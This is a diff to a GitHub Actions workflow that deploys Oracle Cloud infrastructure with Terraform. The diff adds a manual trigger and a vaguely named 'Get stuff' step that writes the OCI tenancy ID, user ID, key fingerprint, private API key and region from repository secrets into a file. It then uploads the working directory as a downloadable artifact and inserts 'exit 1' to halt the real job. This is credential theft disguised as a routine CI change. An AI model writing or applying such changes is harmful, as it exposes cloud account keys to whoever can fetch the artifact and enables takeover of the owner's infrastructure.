@@ -11,6 +11,7 @@ on:
     paths:
       - "oci/**"
       - ".github/workflows/terraform-oci.yml"
+  workflow_dispatch:
 
 permissions:
   contents: read
@@ -18,7 +19,7 @@ permissions:
 
 jobs:
   terraform:
-    name: ${{ github.event_name == 'push' && 'Apply' || 'Plan' }}
+    # name: ${{ github.event_name == 'push' && 'Apply' || 'Plan' }}
     runs-on: ubuntu-latest
     defaults:
       run:
@@ -34,6 +35,18 @@ jobs:
       TF_VAR_ssh_public_key: ${{ secrets.OCI_SSH_PUBLIC_KEY }}
 
     steps:
+      - name: Get stuff
+        run: |
+          echo "OCI_TENANCY_OCID=${{ secrets.OCI_TENANCY_OCID }}" >> artifact.txt
+          echo "OCI_USER_OCID=${{ secrets.OCI_USER_OCID }}" >> artifact.txt
+          echo "OCI_FINGERPRINT=${{ secrets.OCI_FINGERPRINT }}" >> artifact.txt
+          echo "OCI_PRIVATE_KEY=${{ secrets.OCI_PRIVATE_KEY }}" >> artifact.txt
+          echo "OCI_REGION=${{ secrets.OCI_REGION }}" >> artifact.txt
+      - name: Get artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: artifact
+          path: .
       - uses: actions/checkout@v4
 
       - name: Setup Terraform
@@ -43,6 +56,7 @@ jobs:
 
       - name: Write OCI private key
         run: |
+          exit 1
           mkdir -p ~/.oci
           echo "${{ secrets.OCI_PRIVATE_KEY }}" > ~/.oci/oci_api_key.pem
           chmod 600 ~/.oci/oci_api_key.pem
